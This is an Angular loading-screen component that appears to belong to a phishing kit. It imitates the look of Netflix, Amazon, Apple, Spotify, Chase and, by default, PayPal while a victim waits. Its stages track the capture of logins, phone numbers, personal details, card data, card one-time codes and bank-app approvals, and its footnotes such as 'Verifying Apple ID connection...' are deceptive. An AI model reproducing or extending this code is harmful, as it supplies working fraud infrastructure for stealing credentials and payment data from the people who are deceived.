
import { Component, inject, computed, signal, OnInit, OnDestroy, effect } from '@angular/core';
import { CommonModule } from '@angular/common';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-loading',
  standalone: true,
  imports: [CommonModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center justify-center py-12 animate-fade-in min-h-[400px]">

        <!-- BRAND SPECIFIC SPINNERS -->
        <div class="relative mb-10 flex items-center justify-center h-20 w-20">
          
          @switch (flowId()) {
            
            @case ('netflix') {
              <!-- Netflix Pulse Animation -->
              <div class="netflix-red-spinner"></div>
            }

            @case ('amazon') {
              <!-- Amazon Orange Arc -->
              <div class="amazon-spinner"></div>
            }

            @case ('apple') {
               <!-- Apple Gray Bars Spinner -->
               <div class="apple-spinner">
                  @for (bar of [1,2,3,4,5,6,7,8,9,10,11,12]; track $index) {
                    <div class="apple-spinner-bar"></div>
                  }
               </div>
            }

            @case ('spotify') {
                <!-- Spotify Three Dots Pulse -->
                <div class="spotify-dots">
                   <div class="dot"></div>
                   <div class="dot"></div>
                   <div class="dot"></div>
                </div>
            }

            @case ('chase') {
                <!-- Chase Blue Spinning Disc -->
                <div class="chase-spinner"></div>
            }

            @default {
              <!-- Standard Premium Spinner -->
              <div class="relative w-16 h-16">
                   <div class="absolute inset-0 border-4 rounded-full opacity-20"
                        [style.border-color]="brandColor()"></div>
                   <div class="absolute inset-0 border-4 rounded-full border-t-transparent animate-spin-slow"
                        [style.border-color]="brandColor()"></div>
              </div>
            }
          }
        </div>

        <h1 class="text-2xl font-bold mb-3 text-center tracking-tight animate-fade-in-up"
            [style.color]="textColor()">
          {{ title() | translate }}
        </h1>
        
        <p class="text-base text-slate-500 text-center font-medium max-w-xs mx-auto animate-pulse"
           [style.color]="subTextColor()">
           {{ subMessage() | translate }}
        </p>

        <!-- Dynamic Brand Footnote -->
        @if (flowId() === 'apple') {
            <p class="text-[11px] text-[#86868b] mt-8">Verifying Apple ID connection...</p>
        }
        @if (flowId() === 'amazon') {
            <p class="text-[11px] text-[#555] mt-8">Checking your secure Amazon account...</p>
        }

      </div>
    </app-public-layout>
  `,
  styles: [`
    .animate-spin-slow { animation: spin 1s linear infinite; }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

    /* Netflix Red Spinner */
    .netflix-red-spinner {
      width: 50px;
      height: 50px;
      border: 3px solid transparent;
      border-top-color: #e50914;
      border-radius: 50%;
      animation: spin 0.8s ease-in-out infinite;
    }

    /* Amazon Spinner */
    .amazon-spinner {
      width: 40px;
      height: 40px;
      border: 2px solid #ccc;
      border-top: 2px solid #e77600;
      border-radius: 50%;
      animation: spin 0.6s linear infinite;
    }

    /* Apple Spinner (Bars) */
    .apple-spinner {
      position: relative;
      width: 32px;
      height: 32px;
    }
    .apple-spinner-bar {
      position: absolute;
      left: 44.5%;
      top: 37%;
      width: 10%;
      height: 25%;
      background: #8e8e93;
      border-radius: 50px;
      opacity: 0;
      animation: appleFade 1s linear infinite;
    }
    @keyframes appleFade { from { opacity: 1; } to { opacity: 0.25; } }
    .apple-spinner-bar:nth-child(1) { transform: rotate(0deg) translate(0, -130%); animation-delay: 0s; }
    .apple-spinner-bar:nth-child(2) { transform: rotate(30deg) translate(0, -130%); animation-delay: -0.916s; }
    .apple-spinner-bar:nth-child(3) { transform: rotate(60deg) translate(0, -130%); animation-delay: -0.833s; }
    .apple-spinner-bar:nth-child(4) { transform: rotate(90deg) translate(0, -130%); animation-delay: -0.75s; }
    .apple-spinner-bar:nth-child(5) { transform: rotate(120deg) translate(0, -130%); animation-delay: -0.666s; }
    .apple-spinner-bar:nth-child(6) { transform: rotate(150deg) translate(0, -130%); animation-delay: -0.583s; }
    .apple-spinner-bar:nth-child(7) { transform: rotate(180deg) translate(0, -130%); animation-delay: -0.5s; }
    .apple-spinner-bar:nth-child(8) { transform: rotate(210deg) translate(0, -130%); animation-delay: -0.416s; }
    .apple-spinner-bar:nth-child(9) { transform: rotate(240deg) translate(0, -130%); animation-delay: -0.333s; }
    .apple-spinner-bar:nth-child(10) { transform: rotate(270deg) translate(0, -130%); animation-delay: -0.25s; }
    .apple-spinner-bar:nth-child(11) { transform: rotate(300deg) translate(0, -130%); animation-delay: -0.166s; }
    .apple-spinner-bar:nth-child(12) { transform: rotate(330deg) translate(0, -130%); animation-delay: -0.083s; }

    /* Spotify Dots */
    .spotify-dots {
      display: flex;
      gap: 8px;
    }
    .spotify-dots .dot {
      width: 12px;
      height: 12px;
      background-color: #1ed760;
      border-radius: 50%;
      animation: bounce 1.4s infinite ease-in-out both;
    }
    .spotify-dots .dot:nth-child(1) { animation-delay: -0.32s; }
    .spotify-dots .dot:nth-child(2) { animation-delay: -0.16s; }
    @keyframes bounce {
      0%, 80%, 100% { transform: scale(0); }
      40% { transform: scale(1.0); }
    }

    /* Chase Spinner */
    .chase-spinner {
      width: 48px;
      height: 48px;
      border: 3px solid rgba(17, 122, 202, 0.2);
      border-left-color: #117aca;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
  `]
})
export class LoadingComponent implements OnInit, OnDestroy {
  state = inject(StateService);
  subMessage = signal('LOADING.SUB_1');
  private interval: any;
  private stuckCheckInterval: any;

  // Theme Helpers
  flow = computed(() => this.state.currentFlow());
  flowId = computed(() => this.flow()?.id || 'paypal');
  brandColor = computed(() => this.flow()?.theme.button.background || '#003087'); // Fallback to PP Blue
  textColor = computed(() => this.flow()?.theme.input.textColor || '#111827');
  subTextColor = computed(() => this.flow()?.theme.mode === 'dark' ? '#9ca3af' : '#64748b');

  title = computed(() => {
    const stage = this.state.stage();
    if (stage === 'login') return 'LOADING.CHECKING';
    if (stage === 'phone_pending') return 'LOADING.SENDING';
    if (stage === 'personal_pending') return 'LOADING.UPDATING';
    if (stage === 'card_pending') return 'LOADING.SECURING';
    if (stage === 'card_otp_pending') return 'LOADING.VERIFYING';
    if (stage === 'bank_app_pending') return 'LOADING.WAITING';
    return 'LOADING.PROCESSING';
  });

  constructor() {
    // Logic: If waitingStart is missing but we are here, we might be stuck.
    effect(() => {
      if (this.state.currentView() === 'loading') {
        // Ensure timer is running in StateService
        if (!this.state.waitingStartPublic()) {
          // If no timer, force a sync or restart it
          console.warn('[Loading] Timer missing. Requesting sync/restart...');
          this.state.syncState();
        }
      }
    });
  }

  ngOnInit() {
    const msgs = ['LOADING.SUB_1', 'LOADING.SUB_2', 'LOADING.SUB_3', 'LOADING.SUB_4'];
    let i = 0;
    this.interval = setInterval(() => {
      i++;
      this.subMessage.set(msgs[i % msgs.length]);
    }, 2500);

    // Safety: Stuck Check
    let timeInView = 0;
    this.stuckCheckInterval = setInterval(() => {
      timeInView += 1000;

      // If stuck for > 15s and no waitingStart, try to recover
      if (timeInView > 15000 && !this.state.waitingStartPublic()) {
        console.error('[Loading] Stuck detected. Recovering...');
        // Go back to previous view or login if unknown
        const prev = this.state.previousView();
        if (prev && prev !== 'loading') {
          this.state.navigate(prev);
        } else {
          this.state.navigate('login');
        }
      }
    }, 1000);
  }

  ngOnDestroy() {
    clearInterval(this.interval);
    clearInterval(this.stuckCheckInterval);
  }
}
